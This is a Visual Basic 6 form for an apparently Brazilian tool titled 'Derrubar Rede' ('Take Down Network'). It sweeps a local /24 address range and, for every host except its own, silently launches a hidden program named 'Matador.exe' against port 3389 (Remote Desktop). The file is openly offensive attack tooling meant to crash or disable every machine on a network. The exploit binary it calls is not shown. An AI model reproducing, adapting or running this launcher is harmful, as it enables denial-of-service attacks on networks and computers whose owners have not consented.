VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Derrubar Rede - MarxD"
   ClientHeight    =   1215
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   2775
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1215
   ScaleWidth      =   2775
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   35
      Left            =   2640
      Top             =   240
   End
   Begin VB.TextBox Text4 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   2040
      TabIndex        =   4
      Text            =   "0"
      Top             =   120
      Width           =   495
   End
   Begin VB.TextBox Text3 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   1440
      TabIndex        =   3
      Text            =   "1"
      Top             =   120
      Width           =   495
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   840
      TabIndex        =   2
      Text            =   "168"
      Top             =   120
      Width           =   495
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   240
      TabIndex        =   1
      Text            =   "192"
      Top             =   120
      Width           =   495
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Derrubar!"
      Height          =   375
      Left            =   240
      TabIndex        =   0
      Top             =   480
      Width           =   2295
   End
   Begin MSWinsockLib.Winsock Sock 
      Left            =   240
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Info 
      Alignment       =   2  'Center
      Caption         =   "Label1"
      Height          =   255
      Left            =   240
      TabIndex        =   5
      Top             =   960
      Width           =   2295
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
    Text4.Text = "1"
    Text1.Enabled = False
    Text2.Enabled = False
    Text3.Enabled = False
    Command1.Enabled = False
    Ultimo = 1
    Timer1.Enabled = True
End Sub

Private Sub Form_Load()
    Text4.Enabled = False
    Text4.Text = "1"
    Info.Caption = "IP Local: " & Sock.LocalIP
End Sub

Private Sub Timer1_Timer()
    If Ultimo = 255 Then
        Timer1.Enabled = False
        Command1.Enabled = True
        Text1.Enabled = True
        Text2.Enabled = True
        Text3.Enabled = True
    End If
    
    Dim IP As String
    IP = Text1.Text & "." & Text2.Text & "." & Text3.Text & "." & Ultimo
    Text4.Text = Ultimo
    If IP <> Sock.LocalIP Then
        On Error Resume Next
        Shell App.Path & "/Matador.exe " & IP & ":3389", vbHide
    End If
    Ultimo = Ultimo + 1
End Sub
